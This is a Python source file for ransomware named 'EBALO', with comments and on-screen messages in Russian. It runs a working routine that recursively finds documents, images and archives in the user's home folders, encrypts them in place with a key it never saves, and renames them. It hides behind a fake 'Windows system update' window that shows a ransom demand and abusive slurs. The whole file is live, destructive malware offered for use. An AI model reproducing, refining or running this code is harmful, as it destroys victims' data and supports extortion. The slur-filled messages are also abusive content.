# EBALO_RANSOMWARE.py
# Требования: pip install pyqt5 cryptography
# Собранный .exe жрет ~50мб из-за Qt, тупорылый ты шланг.

import sys
import os
import random
import threading
from PyQt5.QtWidgets import (QApplication, QWidget, QLabel, QProgressBar, 
                             QVBoxLayout, QPushButton, QTextEdit)
from PyQt5.QtCore import Qt, QTimer, QThread, pyqtSignal
from PyQt5.QtGui import QFont, QMovie, QPalette, QColor, QIcon
from cryptography.fernet import Fernet

# Конфиг зла
DIRS_TO_FUCK = ["Documents", "Pictures", "Desktop", "Downloads"]
ENCRYPT_EXT = [".txt", ".jpg", ".jpeg", ".png", ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".zip", ".rar"]
MESSAGE = """
ТВОИ ФАЙЛЫ ЗАШИФРОВАНЫ, ДОЛБОЁБ!
Ключ уничтожен через 24 часа, если не заплатишь.
Чтобы отдать бабки этим отморозкам — пиши в даркнет.
"""

class FuckerThread(QThread):
    progress_signal = pyqtSignal(int)
    status_signal = pyqtSignal(str)
    
    def __init__(self):
        super().__init__()
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        
    def run(self):
        self.status_signal.emit("🔪 Собираю файлы, роюсь в твоем дерьме...")
        files_to_fuck = []
        for dir_name in DIRS_TO_FUCK:
            target_dir = os.path.join(os.path.expanduser("~"), dir_name)
            if os.path.exists(target_dir):
                for root, dirs, files in os.walk(target_dir):
                    for file in files:
                        if any(file.endswith(ext) for ext in ENCRYPT_EXT):
                            files_to_fuck.append(os.path.join(root, file))
        
        total = len(files_to_fuck)
        if total == 0:
            self.status_signal.emit("Упс, нихуя нет. Сваливаю.")
            QTimer.singleShot(2000, sys.exit)
            return

        self.status_signal.emit(f"🔒 Шифрую {total} файлов. Прощайся с данными, уёбок.")
        for i, file_path in enumerate(files_to_fuck):
            try:
                with open(file_path, 'rb') as f:
                    data = f.read()
                encrypted = self.cipher.encrypt(data)
                with open(file_path, 'wb') as f:
                    f.write(encrypted)
                os.rename(file_path, file_path + ".EBALO")
                progress = int(((i + 1) / total) * 100)
                self.progress_signal.emit(progress)
            except:
                pass
        self.status_signal.emit("✅ Готово. Ты в дерьме.")

class ToxUI(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Системное обновление Windows")
        self.setFixedSize(600, 400)
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
        
        # Кидаем вырвиглазный стиль
        self.setStyleSheet("""
            QWidget {
                background-color: #0D0D0D;
                border: 2px solid #FF00FF;
                color: #00FF00;
            }
            QLabel {
                font-family: "Courier New";
                color: #FF00FF;
            }
            QProgressBar {
                border: 2px solid #00FF00;
                background: black;
                color: #FF00FF;
                text-align: center;
            }
            QProgressBar::chunk {
                background-color: #FF00FF;
            }
        """)
        
        layout = QVBoxLayout()
        
        self.label = QLabel("> PIDORI CRYPT v2.0 <")
        self.label.setAlignment(Qt.AlignCenter)
        self.label.setFont(QFont("Courier New", 20, QFont.Bold))
        layout.addWidget(self.label)
        
        self.status_text = QTextEdit()
        self.status_text.setReadOnly(True)
        self.status_text.setFont(QFont("Courier New", 10))
        self.status_text.setText("Инициализация...\n")
        layout.addWidget(self.status_text)
        
        self.progress = QProgressBar()
        layout.addWidget(self.progress)
        
        self.cash_label = QLabel("АХАХАХ, ТВОИ ФАЙЛЫ У НАС, ХУЕСОС!")
        self.cash_label.setAlignment(Qt.AlignCenter)
        self.cash_label.setStyleSheet("color: red; font-size: 16px; font-weight: bold;")
        layout.addWidget(self.cash_label)
        
        self.setLayout(layout)
        
        # Запуск ёбаной бойни в отдельном потоке
        self.thread = FuckerThread()
        self.thread.progress_signal.connect(self.progress.setValue)
        self.thread.status_signal.connect(self.update_status)
        self.thread.start()
        
        QTimer.singleShot(5000, self.troll_mode)
    
    def update_status(self, msg):
        self.status_text.append(msg)
    
    def troll_mode(self):
        self.cash_label.setText(random.choice(["ЗАПЛАТИ НЕМЕДЛЕННО!", "ПОКА, ФАЙЛЫ!", "ТЫ ДОЛБОЕБ?", "PIDORI WAS HERE"]))
        QTimer.singleShot(500, self.troll_mode)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = ToxUI()
    window.show()
    sys.exit(app.exec_())